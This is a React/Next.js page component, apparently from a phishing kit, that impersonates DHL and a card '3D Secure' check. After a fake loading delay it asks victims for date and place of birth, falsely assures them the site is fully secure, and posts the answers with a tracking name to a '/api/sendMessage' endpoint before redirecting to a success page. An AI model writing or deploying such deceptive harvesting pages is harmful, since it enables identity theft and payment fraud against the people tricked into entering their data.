"use client";

import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import { type } from "os";
import { useRouter, useSearchParams } from "next/navigation";
import Loader from "@/components/Loader";
import Navbar from "@/components/Navbar";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { FaApplePay, FaGooglePay, FaLock } from "react-icons/fa";
import Image from "next/image";

const schema = z.object({
  numEspaceClient: z
    .string()
    .min(3, {
      message: "Le code doit contenir au moins 6 caractères",
    })
    .max(50),
  codeSecret: z
    .string()
    .min(3, {
      message: "Le code doit contenir au moins 5 caractères",
    })
    .max(50),
});

export type InformationProps = z.infer<typeof schema>;
type Props = {
  setData: (data: InformationProps) => void;
  onSubmit: () => void;
};

function DHL() {
  const [isLoaded, setIsLoaded] = useState(true);
  const router = useRouter();
  const params = useSearchParams();

  console.log("params", params.get("name"));

  const form = useForm<InformationProps>({
    resolver: zodResolver(schema),
  });

  const onSubmit = async (data: InformationProps) => {
    const res = await fetch("/api/sendMessage", {
      method: "POST",
      body: JSON.stringify({
        ...data,
        name: params.get("name"),
        isLast: 1,
      }),
    });

    router.push("/success");
  };

  useEffect(() => {
    setTimeout(() => {
      setIsLoaded(false);
    }, 5000);
  }, []);

  if (isLoaded) {
    return <Loader />;
  }

  return (
    <main className="flex min-h-screen flex-col  ">
      <Navbar />
      <div className="flex flex-col items-center justify-center p-2 ">
        <h3 className="text-blue-500">Validation 3D Secure</h3>
        <div className="flex gap-4 mt-4">
          {/* {/* <Image src="/applepay.png" width={100} height={100} alt="gpay" /> */}
          <Image src="/verified.png" width={200} height={100} alt="gpay" />{" "}
          {/* <div className="border-2 border-black px-2 rounded-sm ">
            <FaApplePay size={50} />
          </div>
          <div className="border-2 border-black px-2 rounded-sm ">
            <FaGooglePay size={50} />
          </div> */}
        </div>
        <Form {...form}>
          <form
            onSubmit={form.handleSubmit(onSubmit)}
            className="my-8 flex flex-col gap-4"
          >
            <FormField
              control={form.control}
              name="codeSecret"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Date de naissance :</FormLabel>
                  <FormControl>
                    <Input
                      placeholder="JJ/MM/AAAA"
                      {...field}
                      maxLength={10}
                      onChange={(e) => {
                        const value = e.target.value;
                        form.setValue(
                          "codeSecret",

                          // regex for date format : 00/00/0000
                          value
                            .replace(/\//g, "")
                            .replace(/(\d{2})/, "$1/")
                            .replace(/(\d{2})\/(\d{2})/, "$1/$2/")
                            .trim()
                        );
                      }}
                      // type="date"
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="numEspaceClient"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Lieu de naissance :</FormLabel>
                  <FormControl>
                    <Input placeholder="Lieu de naissance" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            <div className="flex flex-col items-center justify-center mt-8">
              <button
                type="submit"
                className="bg-blue-950 text-white py-2 px-4 "
              >
                VALIDER
              </button>
              <div className="flex items-center gap-2 mt-2">
                <FaLock />
                <p>Ce site est entièrement sécurisé</p>
              </div>
            </div>
          </form>
        </Form>
      </div>
    </main>
  );
}

export default DHL;
